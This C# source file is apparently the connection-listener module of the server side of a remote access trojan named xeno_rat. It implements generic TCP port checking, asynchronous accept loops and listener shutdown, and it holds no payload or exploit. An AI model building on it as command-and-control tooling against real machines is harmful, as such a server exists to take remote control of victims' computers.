using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.NetworkInformation;

namespace xeno_rat_server
{
    class Listener
    {
        public Dictionary<int, _listener> listeners = new Dictionary<int, _listener>();
        private Func<Socket, Task> ConnectCallBack;

        public Listener(Func<Socket, Task> _ConnectCallBack)
        {
            ConnectCallBack = _ConnectCallBack;
        }

        /// <summary>
        /// Checks if the specified port is in use.
        /// </summary>
        /// <param name="port">The port number to be checked.</param>
        /// <returns>True if the port is in use; otherwise, false.</returns>
        public bool PortInUse(int port)
        {
            IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] ipEndPoints = ipProperties.GetActiveTcpListeners();
            foreach (IPEndPoint endPoint in ipEndPoints)
            {
                if (endPoint.Port == port)
                {
                    return true;
                }
            }
            return false;
        }

        /// <summary>
        /// Creates a listener on the specified <paramref name="port"/> and starts listening for incoming connections.
        /// </summary>
        /// <param name="port">The port number on which to create the listener.</param>
        /// <exception cref="System.InvalidOperationException">Thrown when the specified <paramref name="port"/> is already in use.</exception>
        /// <remarks>
        /// This method checks if the specified <paramref name="port"/> is in use. If the port is available, it creates a new listener and starts listening for incoming connections using the specified <paramref name="port"/>.
        /// If an error occurs during the process, the listener is stopped, and an error message is displayed.
        /// </remarks>
        public void CreateListener(int port)
        {
            if (PortInUse(port))
            {
                MessageBox.Show("That port is currently in use!");
            }
            else
            {
                if (!listeners.ContainsKey(port))
                {
                    listeners[port] = new _listener(port);
                }
                try
                {
                    listeners[port].StartListening(ConnectCallBack);
                }
                catch
                {
                    listeners[port].StopListening();
                    MessageBox.Show("There was an error using this port!");
                }
            }

        }

        /// <summary>
        /// Stops the listener on the specified port.
        /// </summary>
        /// <param name="port">The port number on which the listener is running.</param>
        /// <remarks>
        /// This method stops the listener running on the specified <paramref name="port"/>.
        /// </remarks>
        public void StopListener(int port)
        {
            listeners[port].StopListening();
        }
    }

    class _listener
    {
        private Socket listener;
        private int port;
        public bool listening=false;

        public _listener(int _port)
        {
            port = _port;
        }

        /// <summary>
        /// Starts listening for incoming connections and invokes the specified callback function when a connection is established.
        /// </summary>
        /// <param name="connectCallBack">The callback function to be invoked when a connection is established.</param>
        /// <exception cref="ObjectDisposedException">Thrown when the socket has been closed and the operation is not allowed.</exception>
        /// <remarks>
        /// This method starts listening for incoming connections on any available network interface and port specified by the <paramref name="port"/> variable.
        /// When a connection is established, the specified <paramref name="connectCallBack"/> function is invoked with the connected socket as a parameter.
        /// The method continues to listen for incoming connections until an <see cref="ObjectDisposedException"/> is thrown, indicating that the socket has been closed.
        /// </remarks>
        public async Task StartListening(Func<Socket, Task> connectCallBack)
        {
            IPAddress ipAddress = IPAddress.Any;
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);
            listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            listener.Bind(localEndPoint);
            listener.Listen(100);
            listening = true;
            while (true)
            {
                try
                {
                    Socket handler = await listener.AcceptAsync();
                    connectCallBack(handler);
                }
                catch (ObjectDisposedException)
                {
                    break;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }

        /// <summary>
        /// Stops the listening process and releases the resources associated with the listener.
        /// </summary>
        /// <remarks>
        /// This method sets the <see cref="listening"/> flag to false, indicating that the listening process should stop.
        /// It then attempts to gracefully shut down the socket for both sending and receiving data using the <see cref="SocketShutdown.Both"/> option.
        /// If an exception occurs during the shutdown process, it is caught and ignored.
        /// The method then attempts to close and dispose of the listener, regardless of whether an exception occurred during the shutdown process.
        /// </remarks>
        public void StopListening()
        {
            listening= false;
            try { listener.Shutdown(SocketShutdown.Both); } catch { }
            try { listener.Close(); } catch { }
            try { listener.Dispose(); } catch { }
        }
    }
}
